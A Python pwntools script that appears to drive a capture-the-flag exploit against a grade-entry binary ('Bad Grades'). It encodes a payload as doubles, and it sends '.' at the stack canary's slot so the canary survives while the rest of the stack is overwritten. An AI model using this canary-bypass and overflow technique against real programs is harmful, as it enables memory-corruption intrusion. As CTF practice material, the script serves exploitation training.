import struct
from pwnlib.tubes.process import process
from abstract.pwntarget import PwnTarget


class BadGradesPwn(PwnTarget):
    @classmethod
    def main(cls, proc: process, payload: bytes, pwn_target, *args, **kwargs):
        print(proc.clean(timeout=0.1).decode())

        canary_pos = (pwn_target.offset - 16) // 8
        proc.sendline(b'2')
        print(proc.clean(timeout=0.1).decode())
        proc.sendline(str(len(payload) // 8).encode())

        for i in range(len(payload)//8):
            if i == canary_pos:
                value = '.'
            else:
                value = struct.unpack('d', payload[i*8:(i+1)*8])[0]
                assert struct.pack('d', value) == payload[i*8:(i+1)*8]

            print(proc.clean(timeout=0.1).decode(), value)
            proc.sendline(str(value).encode())

    @classmethod
    def input_handler(cls, proc: process, payload: bytes, *args, **kwargs):
        proc.recvline()
